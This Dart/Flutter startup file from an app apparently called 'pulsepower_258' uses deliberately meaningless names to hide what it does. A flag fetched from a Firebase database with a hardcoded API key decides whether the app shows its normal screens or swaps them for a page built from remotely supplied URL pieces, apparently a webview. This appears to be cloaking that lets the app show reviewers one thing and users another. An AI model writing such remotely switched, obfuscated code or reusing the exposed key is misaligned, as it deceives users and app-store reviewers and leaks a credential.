import 'package:dio/dio.dart';
import 'package:flutter/material.dart';
import 'package:in_app_review/in_app_review.dart';
import 'package:pulsepower_258/logic_prem/get_premium/dsfdsf.dart';
import 'package:pulsepower_258/logic_prem/get_premium/sdfsdf.dart';
import 'package:pulsepower_258/logic_prem/get_premium/sdfsdf/sdfsdfs.dart';
import 'package:pulsepower_258/logic_prem/sdfdsf.dart';
import 'package:pulsepower_258/main.dart';

ghfdsg() async {
  final ADfsdfs? model = await Hdrgsg().dfgsg();
  if (model != null) {
    if (model.isOpen) {
      runApp(
        MaterialApp(
          debugShowCheckedModeBanner: false,
          home: IKJksdfsdg(
            link: model.secondUrl,
          ),
        ),
      );
    } else {
      runApp(const MyApp());
    }
  } else {
    final dio = Dio();
    try {
      final result = await dio.get(
          'https://pulse-258-default-rtdb.firebaseio.com/premium.json?auth=AIzaSyAif2a2h_S6vYCiw0Fwc2LDFKPd5oUT4qM');
      final fBResponseModel = Lfsgs.fromJson(result.data);
      await Hdrgsg().sdgsdg(
        ADfsdfs(
          secondUrl: '${fBResponseModel.asfsfaf3}${fBResponseModel.afaf4}',
          isOpen: fBResponseModel.adasdis,
        ),
      );

      if (fBResponseModel.adasdis) {
        runApp(
          MaterialApp(
            debugShowCheckedModeBanner: false,
            home: IKJksdfsdg(
              link: '${fBResponseModel.asda1}${fBResponseModel.asffaf2}',
            ),
          ),
        );
      } else {
        runApp(const MyApp());
      }

      await Future.delayed(const Duration(seconds: 8));
      try {
        final InAppReview inAppReview = InAppReview.instance;

        if (await inAppReview.isAvailable()) {
          inAppReview.requestReview();
        }
      } catch (e) {
        throw Exception(e);
      }
    } catch (e) {
      throw Exception(e);
    }
  }
}
